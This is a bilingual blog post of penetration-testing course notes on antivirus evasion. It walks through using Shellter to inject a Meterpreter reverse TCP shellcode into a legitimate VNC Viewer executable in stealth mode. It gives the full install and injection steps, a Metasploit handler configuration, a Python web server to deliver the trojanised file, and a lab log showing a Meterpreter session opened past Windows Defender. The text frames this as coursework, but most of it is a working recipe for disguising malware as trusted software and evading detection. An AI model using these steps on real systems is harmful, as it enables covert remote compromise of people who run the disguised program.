---
layout: post
title: "AV Evasion With Shellter"
date: "2023-05-22"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# AV Evasion With Shellter（使用Shellter进行AV规避）
## Defense Evasion
Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. - MITRE

## 防御规避
防御规避是指对抗者在入侵过程中使用的避免被检测的技术。用于防御规避的技术包括卸载/禁用安全软件、混淆/加密数据和脚本。对抗者还会利用和滥用可信进程来隐藏和伪装他们的恶意软件。- MITRE

## AV Detection Methods
AV software will typically utilize signature, heuristic and behavior based detection.

1. Signature based detection - An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database.
	
We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature.
	
2. Heuristic based detection - Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls.

3. Behavior based detection - Relies on identifying malware by monitoring it's behavior. (Used for newer strains of malware)

## AV检测方法
AV软件通常会利用签名、启发式和行为为基础的检测方法。

1. 基于签名的检测 - AV签名是一组唯一的字节序列，用于唯一标识恶意软件。因此，您需要确保您混淆的攻击或有效载荷不与AV数据库中的任何已知签名匹配。

我们可以通过修改恶意软件的字节序列来绕过基于签名的检测，从而改变其签名。

2. 基于启发式的检测 - 依赖规则或决策来确定一个二进制文件是否是恶意的。它还会在代码或程序调用中寻找特定的模式。

3. 基于行为的检测 - 依靠监控恶意软件的行为来识别它。（用于较新的恶意软件变种）

## AV Evasion Techniques
On-disk Evasion Techniques

Obfuscation - Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE.

Encoding - Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format.

Packing - Generate executable with new binary structure with a smaller size and therefore provides the payload with a new signature.

Crypters - Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub.

## AV逃避技术

硬盘上的逃避技术

混淆 - 混淆是指隐藏重要、有价值或关键内容的过程。混淆会重新组织代码，使其更难分析或逆向工程。

编码 - 编码数据是一种将数据使用一种方案转换为新格式的过程。编码是可逆的过程；数据可以编码为新格式，也可以解码回其原始格式。

打包 - 使用新的二进制结构生成具有更小尺寸的可执行文件，从而为负载提供新的签名。

加密器 - 加密代码或负载，并在内存中解密加密的代码。解密密钥/函数通常存储在一个存根中。

## AV Evasion Techniques
In-Memory Evasion Techniques

Focuses on manipulation of memory and does not write files to disk.

Injects payload into a process by leveraging various Windows APIs.

Payload is then executed in memory in a separate thread.

## AV逃避技术
内存中的逃避技术

专注于对内存的操作，不将文件写入磁盘。

通过利用各种Windows API将负载注入到进程中。

然后，在内存中的一个单独线程中执行负载。

# Demo: AV Evasion With Shellter（演示：使用 Shellter 进行 AV 规避）
Welcome to the Antivirus Evasion and Obfuscation section of this course, where we will be introducing you to how antivirus solutions work and how they detect malware, as well as how they can be evaded.

In this specific video, we're going to be taking a look at a very simple example, whereby we'll be injecting reverse shellcode into a legitimate Windows executable. And that will serve two functions. Number one, it will make the final executable look legitimate, because, for example, we can take a look at how to inject our reverse shell shellcode into a program like WinRAR or Google Chrome. That'll make it look legitimate so that the end use or your target will not be able to tell outrightly that that program is malicious. And secondly, this is an antivirus evasion technique. And this is pertinent to signature-based detection.

We're going to be focused on the fundamentals here. In this example, we're going to be taking a look at how to evade very basic signature-based antivirus solutions by injecting our malicious reverse shellcode into a legitimate executable with Shellter.

We are trying to change the signature of the malicious executable that we are generating.

Let's get started with signature-based detection first. So this is the oldest and most commonly used detection method, and it's still used by antivirus solutions our there, even extremely powerful antivirus solutions, one of which is Windows Defender. But Windows Defender and some of the advanced commercial antiviruses use a combination of more than one of these detection methods to ensure that they're able to accurately identify malware whenever it's downloaded onto your system or whenever an attacker is able to get that malware onto your system. 

The way signature-based detection works is the antivirus software has a database of virus signatures or malware signatures. What is a malware or virus signature? A virus signature is a unique sequence of bytes, or rather a unique string of text, that uniquely identified malware of files or executables that are malicious. How is this signature generated? The easiest way that this is done is to just generate a hash of that executable or to get the hash value of that executable. The way this works is whenever there's a new virus that has been developed or new ransomware, the antivirus company will have one of their engineers go ahead and download that malware sample into a secured environment. What they will then do is analyze it. And that's malware analysis will consist of generating a unique signature that uniquely identifies that malware. That signature is then what is included within the antivirus solutions signature database. So whenever you download and install an antivirus solution that utilizes a signature-based detection, it comes with a database of signatures. Let's take a look at a simple example. If I downloaded Google Chrome setup. Once that file is saved on my disk, the antivirus solution goes to work and generates a hash of that executable and then compares that hash or that signature to its own signatures within the signature database. If it matches, then that means that executable is malware. If it doesn't find a match, then, it's not flagged as malware or as a virus. So in terms of evading signature-based detection, we can do this by modifying the malicious executable or the malwares byte sequence, therefore changing the signature. So whenever an exploit developer creates a new piece of malware or ransomware and a signature is generated or made for that particular piece of malware, that particular executable will be detected. So going back to the example of generating a Meterpreter payload with msfvenom, if I generate a Meterpreter payload with msfvenom, transfer it over to the target, the antivirus solution will pretty much have a signature that matches the signature or hash of the meterpreter payload. But if we modify the byte sequence of that meterpreter payload, the hash of that executable or meterpreter payload changes, consequently meaning that if that new hash cannot be matched to an existing signature within the antivirus signature database, then it's not going to be flagged as malware. Antivirus companies have an extensive database of signatures. So you really have to be smart about what you're doing. And the easiest way, in this particular case, is to inject our shellcode that we will generate with Meterpreter into a legitimate executable, therefore masking or generating a signature that in most cases, will not be included or generating a new signature that is not part of an antivirus solutions signature database. That's signature-based detection.


Let's take a look at how we can inject shellcode into a legitimate executable and how that can be used to evade an antivirus, a very basic antivirus detection. And in this case, we'll trying to evade Windows Defender on a Windows 7 system.

[Shellter](https://www.shellterproject.com/)

Shellter

Shellter是一个动态的shellcode注入工具，也是第一个真正动态PE感染器。

它可以用于将shellcode注入到本机Windows应用程序中（目前仅支持32位应用程序）。

Shellcode可以是你自己编写的，也可以是通过诸如Metasploit之类的框架生成的。

Shellter利用PE文件的原始结构，并不对各节（section）进行任何修改，比如改变内存访问权限（除非用户需要），添加具有可读写执行（RWE）权限的额外节，以及其他在杀毒扫描下看起来可疑的操作。

Shellter采用了一种独特的动态方法，基于目标应用程序的执行流程，而这只是冰山一角。

Shellter不仅仅是一个尝试寻找插入指令以重定向执行到有效负载的EPO感染器。与任何其他感染器不同，Shellter的高级感染引擎从不将执行流程转移到代码洞或被感染PE文件中的新增节。

主要特点：

* 兼容Windows x86/x64（XP SP3及以上）和Linux/Mac上的Wine/CrossOver。
* 便携式 - 无需安装。
* 不需要额外的依赖项（如Python、.NET等）。
* 无静态PE模板、框架包装等。
* 支持任何32位有效负载（由Metasploit生成或用户自定义）。
* 与Metasploit的所有类型编码兼容。
* 与用户创建的自定义编码兼容。
* 隐蔽模式 - 保留原始功能。
* 多有效负载PE感染。
* 专有编码 + 用户定义的编码序列。
* 动态线程上下文密钥。
* 支持反射式DLL加载器。
* 内嵌的Metasploit有效负载。
* 垃圾代码多态引擎。
* 线程上下文感知的多态引擎。
* 用户可以使用自己的自定义多态代码。
* 利用动态线程上下文信息进行反静态分析。
* 检测自修改代码。
* 跟踪单线程和多线程应用程序。
* 基于执行流程的完全动态注入位置。
* 反汇编并显示给用户可用的注入点。
* 用户可以选择在何时何地注入。
* 支持命令行。
* 免费。

Wine is a compatibility layer for Linux that allows users on Linux or Unix operating system to execute EXE files.

In order to install Shellter:

```
sudo apt-get install shellter -y
```

However, there's a very important aspect that you need to take into consideration here. The Shellter package is a Windows executable. How will you run a Windows executable on Linux? That can be facilitated through the use of a tool called Wine. Wine is a compatibility layer for Linux that allows you to execute Windows executables on a Linux or on a Unix system like Mac. So after installing the Shellter package, you then need to install Wine. The specific architecture or the package that we'll be installing in regards to Wine is the Wine 32-bit package. And this is primarily because Shellter only supports 32-bit payloads, or rather supports the generation of shellcode of 32-bit shellcode. So we need to configure the Debian package management utility to allow us to install 32-bit packages. Because the current Kali Linux VM that I'm utilizing is 64-bit. And the Debian package management utility has been already configured to only install 64-bit packages.

To install 32-bit packages:

`i386`: that's for 32 bits.

```
sudo dpkg --add-architecture i386
```

I can now install wine32.

```
sudo apt-get install wine32
```

At this point, you can now execute the Shellter executable with Wine, or with Wine32 in this case.

```
cd /usr/share/windows-resources/shellter
ls -al
```

How do you execute an EXE file on Linux?

```
sudo wine shellter.exe
```

Let's get started with the injection process.

However, before we do that we need to identify a legitimate executable that we can inject our shellcode into.

This is where the whole social engineering aspect of things comes into play. So you can download an executable. I would recommend that the executable is very small and very simplistic in terms of its functionality. This will probably not work if you try and inject your shellcode into an executbale like the Chrome installer or VLC or anything like that.

```
/usr/share/windows-binaries/
```

That contains a list of executables that are used during a pen test or during a security assessment.

vncviewer is a very simple Windows program. It's not malicious at all. It's completely legitimate and it's used to connect to a VNC session or to establish a VNC session. It's just a utility that allows you to connect to a server or to a target system and establish a VNC session. So we can inject our shellcode into this executable.

```
cd /home/kali/Desktop/AVBypass
cp /usr/share/windows-binaries/vncviewer.exe .
```

This is the original executable. The great thing with Shellter is that whenever you perform the injection, a copy of this will be made. So a backup of the original will be made, and it will be stored under

```
/usr/share/windows-resources/shellter/Shellter_Backups
```

Now that we've identified the legitimate executable that we would like to inject our shellcode into, we can begin the injection process. 

```
sudo wine shellter.exe
```

```
A
```

PE Target: This is the Portable Executable target, or the legitimate executable that you would like to inject your shellcode into. You need to specify the path to the executable.

```
/home/kali/Desktop/AVBypass/vncviewer.exe
```

It's going to make a backup, and it will store it under Shellter_Backups\vncviewer.exe

Stealth Mode, this is a very important step because what it's asking you is whether you want the executable to function as intended. For example, in this case, we are injecting the shellcode into vncviewer.exe. So it's asking us whether or not we want vncviewer to function normally when executed.

If we want that to happen, which I recommend that you do, I would enable Stealth Mode:

```
y
```

What that means is that whenever the target will click on the new vncviewer that we are going to be generating or that contains the injected shellcode, vncviewer will function as normal, but the shellcode will be executed in the background. 

It's then going to ask you for the payload that you'd like to use. So this is where the shellcode injection process comes into play.

```
[1] Meterpreter_Reverse_TCP [stager]
```

If you want to go ahead and encode a payload with msfvenom firtstly, or you want to generate a meterpreter payload and then encode it with msfvenom, you can do that and then specify a custom `C` option here, and then use that payload itself.

`L`: use a listed payload.

```
L
1
```

We now have vncviewer, but the new executable has the injected shellcode. Shellter takes a backup, it does that for a reason. Because the new executable is going to replace the one that was stored within the `/home/kali/Desktop/AVBypass/` directory. Remember, I copied over the legitimate vncviewer.exe to the AVBypass folder. And this is now the malicious executable. It'll then perform the injection. And it's going to replace the older one with the new malicious one. 

So I can now copy this over to the target system, and you'll see that it looks exactly like vncviewer. It'll function exactly like vncviewer. The only difference is that when it will be executed, it will execute the shellcode, our Meterpreter payload shellcode, and it'll then connect back to our reverse tcp handler that we will set up in the Metasploit Framework right now.

The first thing I want to do is I'm just going to launch msfconsole to set up the handler to receive the connection once the shellcode is executed on the target.

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 1234
run
```

We need to transfer that executable to the target. 

```
cd ~/Desktop/AVBypass
ls
sudo python3 -m http.server 80
```

The Windows 7 system has Windows Defender enabled.

I'm back on the Windows system.

```
http://10.10.10.10/vncviewer.exe
```

If I click on it, is should work exactly the way vncviewer should work. However, in the background, what's going to happen is it's going to execute the shellcode that we injected into it.

It works as intended, and a person can use this for legitimate purposes, but it had malicious shellcode injected into it. So this particular executable has not been detected by Windows Defender.

I have received a Meterpreter session on my multi/handler listener.

```
meterpreter > sysinfo
meterpreter > getuid
```

That is how to inject shellcode into a legitimate executable for the purpose of evading signature-based antivirus solutions.

# 复现视频内容
Kali Linux: 192.168.213.128

Windows 7 SP1: 192.168.213.131

[Download Shellter](https://www.shellterproject.com/download/)

这里直接下载的Shellter v7.2 Executable。在Windows 7 SP1环境下将meterpreter shellcode注入vncview。

```
C:\Users\IEUser\Downloads\shellter\shellter>dir
 Volume in drive C is Windows 7
 Volume Serial Number is 5812-32B0

 Directory of C:\Users\IEUser\Downloads\shellter\shellter

05/22/2023  10:19 PM    <DIR>          .
05/22/2023  10:19 PM    <DIR>          ..
05/22/2023  10:19 PM    <DIR>          docs
02/19/2020  11:41 PM                64 Executable_SHA-256.txt
05/22/2023  10:19 PM    <DIR>          licenses
05/22/2023  10:19 PM    <DIR>          shellcode_samples
02/19/2020  11:34 PM           691,712 shellter.exe
               2 File(s)        691,776 bytes
               5 Dir(s)  17,994,190,848 bytes free
```

```
C:\Users\IEUser\Desktop\AVBypass>dir
 Volume in drive C is Windows 7
 Volume Serial Number is 5812-32B0

 Directory of C:\Users\IEUser\Desktop\AVBypass

05/22/2023  10:24 PM    <DIR>          .
05/22/2023  10:24 PM    <DIR>          ..
05/22/2023  06:22 AM        11,606,336 VNC-Viewer-7.1.0-Windows.exe
               1 File(s)     11,606,336 bytes
               2 Dir(s)  17,971,232,768 bytes free
```

```
C:\Users\IEUser\Downloads\shellter\shellter>shellter.exe



        1010101 01   10 0100110 10     01  11001001 0011101 001001
        11      10   01 00      01     01     01    10      11   10
        0010011 1110001 11011   11     10     00    10011   011001
             11 00   10 01      11     01     11    01      01   11
        0010010 11   00 0011010 100111 000111 00    1100011 01   10 v7.2
        www.ShellterProject.com



Choose Operation Mode - Auto/Manual (A/M/H): A

Perform Online Version Check? (Y/N/H): N

PE Target: C:\Users\IEUser\Desktop\AVBypass\VNC-Viewer-7.1.0-Windows.exe

**********
* Backup *
**********

Backup: Shellter_Backups\VNC-Viewer-7.1.0-Windows.exe




********************************
* PE Compatibility Information *
********************************

Minimum Supported Windows OS: 6.0

Note: It refers to the minimum required Windows version for the target
      application to run. This information is taken directly from the
      PE header and might be not always accurate.




******************
* Packed PE Info *
******************

Status: Possibly Not Packed - The EntryPoint is located in the first section!




***********************
* PE Info Elimination *
***********************

Data: Dll Characteristics (Dynamic ImageBase etc...), Digital Signature.

Status: All related information has been eliminated!




****************
* Tracing Mode *
****************

Status: Tracing has started! Press CTRL+C to interrupt tracing at any time.

Note: In Auto Mode, Shellter will trace a random number of instructions
      for a maximum time of approximately 30 seconds in native Windows
      hosts and for 60 seconds when used in Wine.



DisASM.dll was created successfully!



The following PEB flags have been reset:

1. PEB.BeingDebugged

2. PEB.NtGlobalFlag




Instructions Traced: 799285

Tracing Time Approx: 0.547 mins.



Starting First Stage Filtering...



*************************
* First Stage Filtering *
*************************

Filtering Time Approx: 0.13 mins.



Enable Stealth Mode? (Y/N/H): Y

************
* Payloads *
************

[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
[3] Meterpreter_Reverse_HTTPS [stager]
[4] Meterpreter_Bind_TCP      [stager]
[5] Shell_Reverse_TCP         [stager]
[6] Shell_Bind_TCP            [stager]
[7] WinExec

Use a listed payload or custom? (L/C/H): L

Select payload by index: 1

***************************
* meterpreter_reverse_tcp *
***************************

SET LHOST: 192.168.213.128

SET LPORT: 1234



****************
* Payload Info *
****************

Payload: meterpreter_reverse_tcp

Size: 281 bytes

Reflective Loader: NO

Encoded-Payload Handling: Enabled

Handler Type: IAT



******************
* Encoding Stage *
******************

Encoding Payload: Done!


****************************
* Assembling Decoder Stage *
****************************

Assembling Decoder: Done!


***********************************
* Binding Decoder & Payload Stage *
***********************************

Status: Obfuscating the Decoder using Thread Context Aware Polymorphic
        code, and binding it with the payload.

Please wait...

Binding: Done!


*********************
* IAT Handler Stage *
*********************


Fetching IAT Pointers to Memory Manipulation APIs...


0. VirtualAlloc --> N/A
1. VirtualAllocEx --> N/A
2. VirtualProtect --> Not Allowed in Stealth Mode!
3. VirtualProtectEx --> N/A
4. HeapCreate/HeapAlloc --> N/A
5. LoadLibrary/GetProcAddress --> IAT[5241d4]/IAT[52415c]
6. GetModuleHandle/GetProcAddress --> IAT[524188]/IAT[52415c]
7. CreateFileMapping/MapViewOfFile --> IAT[524390]/IAT[524394]

Using Method --> 5



***************************
* IAT Handler Obfuscation *
***************************

Status: Binding the IAT Handler with Thread Context Aware Polymorphic code.

Please wait...

Code Generation Time Approx: 0.031 seconds.



*************************
* PolyMorphic Junk Code *
*************************

Type: Engine

Generating: ~455 bytes of PolyMorphic Junk Code

Please wait...

Generated: 459 bytes

Code Generation Time Approx: 0 seconds.



Starting Second Stage Filtering...



**************************
* Second Stage Filtering *
**************************

Filtering Time Approx: 0.00157 mins.



*******************
* Injection Stage *
*******************

Virtual Address: 0x42fa81

File Offset: 0x2ee81

Section: .text


Adjusting stub pointers to IAT...

Done!


Adjusting Call Instructions Relative Pointers...

Done!


Injection Completed!



*******************
* PE Checksum Fix *
*******************

Status: Valid PE Checksum has been set!

Original Checksum: 0xb13417

Computed Checksum: 0xb1b94a



**********************
* Verification Stage *
**********************


Info: Shellter will verify that the first instruction of the
      injected code will be reached successfully.
      If polymorphic code has been added, then the first
      instruction refers to that and not to the effective
      payload.
      Max waiting time: 10 seconds.

 Warning!
 If the PE target spawns a child process of itself before
 reaching the injection point, then the injected code will
 be executed in that process. In that case Shellter won't
 have any control over it during this test.
 You know what you are doing, right? ;o)

Injection: Verified!


Press [Enter] to continue...
```

```
┌──(root㉿kali)-[~]
└─# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.213.128
LHOST => 192.168.213.128
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.213.128:1234 
```

点击AVBypass中Shellter生成的VNC Viewer Installer。

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.213.128:1234 
[*] Sending stage (175686 bytes) to 192.168.213.131
[*] Meterpreter session 1 opened (192.168.213.128:1234 -> 192.168.213.131:49262) at 2023-05-22 09:47:43 -0400

meterpreter > sysinfo
Computer        : IEWIN7
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter > getuid
Server username: IEWIN7\IEUser
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```






